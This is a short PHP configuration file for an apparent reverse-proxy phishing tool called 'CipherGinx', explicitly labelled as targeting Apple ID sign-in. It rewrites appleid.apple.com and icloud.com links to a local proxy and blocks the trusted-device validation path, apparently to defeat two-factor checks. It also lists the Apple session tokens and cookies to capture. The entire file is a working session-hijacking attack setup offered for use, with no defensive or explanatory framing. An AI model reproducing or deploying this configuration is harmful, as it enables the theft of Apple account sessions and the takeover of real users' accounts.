<?php
// CipherGinx PHP - Apple ID Phishing Configuration
// Targets Apple ID authentication

return [
    'hostname' => 'appleid.apple.com',
    'isSSL' => true,
    'server' => 'localhost',
    'port' => 443,

    'inject_domain' => [
        ['appleid.apple.com', 'localhost'],
        ['icloud.com', 'localhost'],
    ],

    'req_headers' => [
        ['', ['Connection' => 'close']],
    ],

    'resp_headers' => [
        ['', []],
    ],

    'req_body' => [],

    'resp_body' => [
        ['', 'https://appleid.apple.com', 'https://localhost'],
        ['', 'https://icloud.com', 'https://localhost'],
    ],

    'block_paths' => [
        '/auth/validate/trusteddevice',
    ],

    'get_cookie' => [
        'X-APPLE-SESSION-TOKEN',
        'X-APPLE-ID-SESSION-ID',
        '__Host-AADP_XSRF_TOKEN',
        'geo',
    ],
];
